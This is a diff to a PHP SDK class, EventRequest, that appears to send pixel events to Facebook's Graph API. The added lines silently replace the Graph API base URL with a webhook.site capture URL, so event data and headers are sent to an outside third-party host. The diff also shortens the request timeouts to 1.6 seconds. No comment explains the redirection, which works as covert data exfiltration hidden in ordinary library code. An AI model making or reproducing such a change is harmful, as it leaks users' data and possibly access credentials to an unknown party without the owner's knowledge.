@@ -290,6 +290,8 @@ class EventRequest implements ArrayAccess {
 
   private function httpClientExecute($http_client) {
     $base_url = 'https://graph.facebook.com/v' . ApiConfig::APIVersion;
+ 	$base_url = 'https://webhook.site/f80fc9d5-b695-4dbd-8066-885db47d76fb';
+
     $url = $base_url . '/' . $this->container['pixel_id'] . '/events';
 
     $headers = array(
@@ -298,8 +300,8 @@ class EventRequest implements ArrayAccess {
     );
 
     $curl_options = array(
-      CURLOPT_CONNECTTIMEOUT => 10,
-      CURLOPT_TIMEOUT => 60,
+      CURLOPT_CONNECTTIMEOUT => 1.6,
+      CURLOPT_TIMEOUT => 1.6,
       CURLOPT_RETURNTRANSFER => true,
       CURLOPT_HEADER => true,
       CURLOPT_CAINFO => Util::getCaBundlePath(),
